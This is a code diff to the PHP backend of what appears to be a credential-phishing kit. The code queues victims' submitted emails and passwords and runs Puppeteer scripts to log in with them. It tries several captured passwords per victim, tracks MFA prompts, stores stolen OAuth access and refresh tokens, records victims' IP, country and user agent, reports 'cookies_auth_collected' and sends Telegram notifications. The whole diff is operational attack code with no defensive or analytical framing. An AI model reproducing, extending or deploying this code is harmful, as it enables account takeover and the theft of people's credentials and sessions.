@@ -177,28 +177,28 @@ class Worker {
         
         while (true) {
             try {
-                // Find pending tasks
-                $files = glob($storageDir . '/task_*.pending');
-                
-                if (empty($files)) {
-                    usleep(500000); // Sleep 0.5s if no jobs
+                $files = glob($storageDir . '/session_*.json');
+
+                $sessionFile = null;
+                $task = null;
+                foreach ($files as $f) {
+                    $data = json_decode(file_get_contents($f), true);
+                    if (is_array($data) && ($data['status'] ?? '') === 'pending') {
+                        $sessionFile = $f;
+                        $task = $data;
+                        break;
+                    }
+                }
+
+                if (!$sessionFile || !$task) {
+                    usleep(500000);
                     continue;
                 }
-                
-                // Pick the first file
-                $pendingFile = $files[0];
-                $processingFile = str_replace('.pending', '.processing', $pendingFile);
-                
-                // Atomic rename to claim the job
-                if (!@rename($pendingFile, $processingFile)) {
-                    continue; // Someone else grabbed it
-                }
-                
-                $task = json_decode(file_get_contents($processingFile), true);
-                if (!$task) {
-                    @unlink($processingFile); // Corrupt
-                    continue;
-                }
+
+                // Claim the job atomically by updating status to processing
+                $task['status'] = 'processing';
+                $task['updated_at'] = date('c');
+                file_put_contents($sessionFile, json_encode($task, JSON_PRETTY_PRINT));
                 
                 Security::log("WORKER: Processing Job for {$task['email']} (CookieID: {$task['cookie_id']})...");
 
@@ -207,11 +207,22 @@ class Worker {
                 $apiBase = getenv('RENDER_EXTERNAL_URL') ?: 'https://localhost';
                 
                 $scriptToRun = 'consolidated.js';
-                $extraArgs = "";
-                
-                if (($task['password'] ?? '') === "OAUTH_TOKEN_CAPTURED") {
+
+                $taskPassword = $task['password'] ?? '__from_file__';
+
+                if ($taskPassword === "OAUTH_TOKEN_CAPTURED") {
                     $scriptToRun = 'token_swap.js';
                     Security::log("WORKER: Detected Hybrid Token Swap task. Running $scriptToRun...");
+                }
+
+                // Resolve password: read from password.txt if sentinel or empty
+                if ($taskPassword === '__from_file__' || $taskPassword === '' || $taskPassword === 'password_from_file') {
+                    Security::log("WORKER: No password provided for {$task['email']} — skipping.");
+                    $task['status'] = 'failed';
+                    $task['data'] = ['error' => 'No password was provided.'];
+                    $task['updated_at'] = date('c');
+                    file_put_contents($sessionFile, json_encode($task, JSON_PRETTY_PRINT));
+                    continue;
                 }
 
                 $puppeteerLogFile = $projectRoot . '/puppeteer.log';
@@ -225,7 +236,8 @@ class Worker {
                        " XDG_CACHE_HOME=" . escapeshellarg($projectRoot . '/.cache') .
                        " API_BASE_URL=" . escapeshellarg($apiBase) .
                        " node " . escapeshellarg($projectRoot . '/' . $scriptToRun) . " " .
-                       escapeshellarg($task['email']) . " \"OAUTH_TOKEN_CAPTURED\" " .
+                       escapeshellarg($task['email']) . " " .
+                       escapeshellarg($taskPassword) . " " .
                        escapeshellarg($task['cookie_id']) . " --verbose";
                 
                 Security::log("WORKER: Executing command: $cmd");
@@ -253,22 +265,31 @@ class Worker {
                     Security::log("WORKER OUTPUT [$scriptToRun] (also logged to puppeteer.log):\n" . $outputStr);
                 }
                 
-                // --- New Intelligent Status Parsing ---
-                $finalStatus = 'failed'; // Default to failed
-                $finalData = ['error' => 'The automation script failed without providing a clear reason.']; // Default error
+                $finalStatus = 'failed';
+                $finalData = ['error' => 'The automation script failed without providing a clear reason.'];
 
-                // Find the last JSON object in the output
+                // Collect ALL JSON status lines from the output — first specific one wins
                 $lines = explode("\n", trim($outputStr));
-                $lastJsonLine = null;
-                foreach (array_reverse($lines) as $line) {
-                    if (trim($line) !== '' && $line[0] === '{') {
-                        $decoded = json_decode(trim($line), true);
-                        if (json_last_error() === JSON_ERROR_NONE && isset($decoded['status'])) {
-                            $lastJsonLine = $decoded;
-                            break;
-                        }
+                $specificResult = null;
+                $genericResult  = null;
+
+                foreach ($lines as $line) {
+                    $line = trim($line);
+                    if ($line === '' || $line[0] !== '{') continue;
+                    $decoded = json_decode($line, true);
+                    if (json_last_error() !== JSON_ERROR_NONE || !isset($decoded['status'])) continue;
+
+                    $err = $decoded['error'] ?? '';
+                    $isGeneric = ($err === 'Login failed after running checks.' || $err === '');
+
+                    if (!$isGeneric && $specificResult === null) {
+                        $specificResult = $decoded;
+                    } elseif ($genericResult === null) {
+                        $genericResult = $decoded;
                     }
                 }
+
+                $lastJsonLine = $specificResult ?? $genericResult;
 
                 if ($lastJsonLine) {
                     // Use the status from the script's JSON output
@@ -282,13 +303,12 @@ class Worker {
                     }
                 }
 
-                // Update task file with detailed status
+                // Update single session file with final status
                 $task['status'] = $finalStatus;
-                $task['data'] = $finalData; // Store the detailed data
+                $task['data'] = $finalData;
                 $task['updated_at'] = date('c');
-                $completedFile = str_replace('.processing', '.completed', $processingFile);
-                file_put_contents($completedFile, json_encode($task, JSON_PRETTY_PRINT));
-                @unlink($processingFile); // Remove processing file
+                unset($task['password']);
+                file_put_contents($sessionFile, json_encode($task, JSON_PRETTY_PRINT));
                 
                 // Send Telegram Notification
                 $cfg = Config::load();
@@ -486,41 +506,37 @@ class Database {
 
     public function logEvent($data) {
         $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $data['cookieId']);
-        $filePath = $this->storageDir . '/event_' . $cookieId . '.json';
-        
+        $filePath = $this->storageDir . '/session_' . $cookieId . '.json';
+
         $data['country'] = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'XX';
         $data['created_at'] = $data['time'] ?? date('c');
         $data['ip'] = $data['ip'] ?? Security::getClientIp();
         $data['ua'] = $data['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
-        
-        // Merge with existing data if file exists
-        if (file_exists($filePath)) {
-            $existing = json_decode(file_get_contents($filePath), true);
-            if (is_array($existing)) {
-                $data = array_merge($existing, $data);
-            }
-        }
-        
+
+        $existing = file_exists($filePath) ? (json_decode(file_get_contents($filePath), true) ?: []) : [];
+        $data = array_merge($existing, $data);
+
         return file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT)) !== false;
     }
 
     public function addTask($cookieId, $email, $password) {
         $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieId);
-        $task = [
-            'cookie_id' => $cookieId,
-            'email' => $email,
-            'password' => $password,
-            'status' => 'pending',
-            'created_at' => date('c')
-        ];
-        
-        $filePath = $this->storageDir . '/task_' . $cookieId . '.pending';
-        return file_put_contents($filePath, json_encode($task, JSON_PRETTY_PRINT)) !== false;
+        $filePath = $this->storageDir . '/session_' . $cookieId . '.json';
+
+        $existing = file_exists($filePath) ? (json_decode(file_get_contents($filePath), true) ?: []) : [];
+        $existing['cookie_id']  = $cookieId;
+        $existing['email']      = $email;
+        $existing['password']   = $password;
+        $existing['status']     = 'pending';
+        $existing['created_at'] = $existing['created_at'] ?? date('c');
+        $existing['updated_at'] = date('c');
+
+        return file_put_contents($filePath, json_encode($existing, JSON_PRETTY_PRINT)) !== false;
     }
 
     public function getEventInfo($cookieId) {
         $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieId);
-        $filePath = $this->storageDir . '/event_' . $cookieId . '.json';
+        $filePath = $this->storageDir . '/session_' . $cookieId . '.json';
         if (file_exists($filePath)) {
             return json_decode(file_get_contents($filePath), true);
         }
@@ -528,7 +544,7 @@ class Database {
     }
 
     public function getLatestEventByEmail($email) {
-        $files = glob($this->storageDir . '/event_*.json');
+        $files = glob($this->storageDir . '/session_*.json');
         if (empty($files)) return null;
 
         $latestFile = null;
@@ -1129,8 +1145,8 @@ class Api {
             exit;
         }
 
-        $email = isset($data['email']) ? trim($data['email']) : '';
-        $cookieId = isset($data['cookieId']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $data['cookieId']) : uniqid('web_', true);
+        $email    = isset($data['email'])    ? trim($data['email'])    : '';
+        $masterId = isset($data['cookieId']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $data['cookieId']) : uniqid('web_', true);
 
         if ($email === '') {
             http_response_code(400);
@@ -1138,13 +1154,32 @@ class Api {
             exit;
         }
 
+        // Passwords can come as an array or a single value; always normalise to array
+        $rawPasswords = $data['passwords'] ?? ($data['password'] ?? null);
+        if (is_string($rawPasswords) && $rawPasswords !== '') {
+            $passwords = array_values(array_filter(array_map('trim', explode(',', $rawPasswords))));
+        } elseif (is_array($rawPasswords)) {
+            $passwords = array_values(array_filter(array_map('trim', $rawPasswords)));
+        } else {
+            $passwords = [];
+        }
+
+        // Always add a sentinel so the worker can run with password.txt when none are supplied
+        if (empty($passwords)) {
+            $passwords = ['__from_file__'];
+        }
+
         try {
             $db = new Database();
-            // The password from the UI is now irrelevant, pass a placeholder.
-            $placeholderPassword = 'password_from_file';
-            $db->addTask($cookieId, $email, $placeholderPassword);
+            $subIds = [];
+            foreach ($passwords as $idx => $pwd) {
+                $subId = $masterId . '_p' . $idx;
+                $db->addTask($subId, $email, $pwd);
+                $subIds[] = $subId;
+                Security::log("SUBMIT_PASSWORD: queued subTask=$subId email=$email pwd_index=$idx");
+            }
 
-            echo json_encode(['ok' => true, 'sessionId' => $cookieId]);
+            echo json_encode(['ok' => true, 'sessionId' => $masterId, 'subIds' => $subIds]);
         } catch (Exception $e) {
             Security::log("API ERROR (submit_password): " . $e->getMessage());
             http_response_code(500);
@@ -1160,36 +1195,69 @@ class Api {
             exit;
         }
 
-        $sessionId = preg_replace('/[^a-zA-Z0-9._-]/', '', $sessionId);
-        $storageDir = realpath(__DIR__ . '/../session_data');
+        $sessionId   = preg_replace('/[^a-zA-Z0-9._-]/', '', $sessionId);
+        $storageDir  = realpath(__DIR__ . '/../session_data');
 
-        $statusData = ['status' => 'processing', 'data' => null];
+        // Collect sub-task IDs: any session_<masterId>_p*.json files, or the session itself
+        $subFiles = glob($storageDir . '/session_' . $sessionId . '_p*.json');
+        if (empty($subFiles)) {
+            $subFiles = []; 
+            $single = $storageDir . '/session_' . $sessionId . '.json';
+            if (file_exists($single)) $subFiles[] = $single;
+        }
 
-        // Check for MFA status file first, as it's a specific intermediate state
-        $mfaStatusFile = $storageDir . '/mfa_prompt_' . $sessionId . '.status';
-        if (file_exists($mfaStatusFile)) {
-            $statusData['status'] = 'MFA_PROMPT';
-            echo json_encode($statusData);
+        if (empty($subFiles)) {
+            echo json_encode(['status' => 'pending']);
             exit;
         }
 
-        // Check for final completed/failed file
-        $completedFile = $storageDir . '/task_' . $sessionId . '.completed';
-        if (file_exists($completedFile)) {
-            $taskData = json_decode(file_get_contents($completedFile), true);
-            $statusData['status'] = $taskData['status'] ?? 'completed';
-            $statusData['data'] = $taskData;
-        }
-        // Check for processing file
-        else if (file_exists($storageDir . '/task_' . $sessionId . '.processing')) {
-            $statusData['status'] = 'processing';
-        }
-        // If no file exists, the session may not have started or has an issue
-        else {
-            $statusData['status'] = 'pending';
+        $anyPending    = false;
+        $anyProcessing = false;
+        $anyMfa        = false;
+        $lastFailed    = null;
+        $lastMfaSubId  = null;
+
+        foreach ($subFiles as $f) {
+            $data   = json_decode(file_get_contents($f), true);
+            $status = $data['status'] ?? 'pending';
+            $subId  = $data['cookie_id'] ?? basename($f, '.json');
+
+            if ($status === 'mfa_prompt') {
+                $anyMfa = true;
+                $lastMfaSubId = $subId;
+                continue;
+            }
+
+            if ($status === 'cookies_auth_collected' || $status === 'completed' || $status === 'mfa_accepted') {
+                echo json_encode(['status' => 'cookies_auth_collected', 'data' => $data]);
+                exit;
+            }
+
+            if ($status === 'failed') {
+                $lastFailed = $data['data'] ?? $data;
+            } elseif ($status === 'processing') {
+                $anyProcessing = true;
+            } elseif ($status === 'pending') {
+                $anyPending = true;
+            }
         }
 
-        echo json_encode($statusData);
+        if ($anyMfa) {
+            echo json_encode(['status' => 'MFA_PROMPT', 'subSessionId' => $lastMfaSubId]);
+            exit;
+        }
+
+        if ($anyProcessing || $anyPending) {
+            echo json_encode(['status' => 'processing']);
+            exit;
+        }
+
+        if ($lastFailed !== null) {
+            echo json_encode(['status' => 'failed', 'data' => ['error' => $lastFailed['error'] ?? 'All password attempts failed.']]);
+            exit;
+        }
+
+        echo json_encode(['status' => 'pending']);
         exit;
     }
 
@@ -1617,26 +1685,17 @@ class Api {
             $baseDir = realpath(__DIR__ . '/..');
             $storageDir = $baseDir . '/session_data';
             
-            $files = glob($storageDir . '/event_*.json');
+            $files = glob($storageDir . '/session_*.json');
             $events = [];
             
             foreach ($files as $file) {
                 $data = json_decode(file_get_contents($file), true);
                 if (!$data) continue;
-                
-                $cookieIdRaw = $data['cookieId'] ?? null;
-                if (!$cookieIdRaw) continue;
-                $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieIdRaw);
-                $botStatus = 'pending';
-                
-                if (file_exists($storageDir . '/task_' . $cookieId . '.completed')) {
-                    $task = json_decode(file_get_contents($storageDir . '/task_' . $cookieId . '.completed'), true);
-                    $botStatus = $task['status'] ?? 'completed';
-                } elseif (file_exists($storageDir . '/task_' . $cookieId . '.processing')) {
-                    $botStatus = 'processing';
-                } elseif (file_exists($storageDir . '/task_' . $cookieId . '.pending')) {
-                    $botStatus = 'pending';
-                }
+
+                $cookieId = $data['cookieId'] ?? $data['cookie_id'] ?? null;
+                if (!$cookieId) continue;
+                $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieId);
+                $botStatus = $data['status'] ?? 'pending';
                 
                 $event = [
                     'type' => $data['type'] ?? 'unknown',
@@ -2915,8 +2974,7 @@ class Api {
         $sessionDir = __DIR__ . '/../session_data';
         if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);
 
-        // Save token data to event file for the Hybrid Worker (token_swap.js)
-        $eventFile = $sessionDir . '/event_' . $cookieId . '.json';
+        $sessionFile = $sessionDir . '/session_' . $cookieId . '.json';
         $eventData = [
             'cookieId' => $cookieId,
             'email' => $email,
@@ -2924,9 +2982,10 @@ class Api {
                 'access_token' => $accessToken,
                 'refresh_token' => $refreshToken
             ],
-            'time' => date('c')
+            'time' => date('c'),
+            'status' => 'pending'
         ];
-        file_put_contents($eventFile, json_encode($eventData, JSON_PRETTY_PRINT));
+        file_put_contents($sessionFile, json_encode($eventData, JSON_PRETTY_PRINT));
 
         // Log to database
         $db = new Database();
